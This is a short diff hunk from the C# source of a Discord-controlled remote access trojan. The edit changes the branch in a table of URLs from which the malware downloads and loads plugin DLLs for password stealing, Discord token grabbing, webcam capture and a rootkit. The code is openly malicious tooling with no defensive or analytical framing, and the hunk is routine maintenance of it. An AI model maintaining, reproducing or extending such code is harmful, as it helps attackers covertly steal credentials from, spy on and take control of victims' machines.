@@ -153,11 +153,11 @@ namespace Discord_rat
         public static Dictionary<string, Assembly> dll_holder = new Dictionary<string, Assembly>();
         public static Dictionary<string, object> activator_holder = new Dictionary<string, object>();
         public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string> {
-            {"password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/PasswordStealer.dll"},
-            { "rootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/rootkit.dll"},
-            { "unrootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/unrootkit.dll"},
-            { "webcam","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/Webcam.dll"},
-            { "token","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/main/Discord%20rat/Resources/Token%20grabber.dll"}
+            {"password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll"},
+            { "rootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll"},
+            { "unrootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/unrootkit.dll"},
+            { "webcam","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll"},
+            { "token","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll"}
         };
         public static Dictionary<object, object> ObjectToDictionary(object obb)
         {
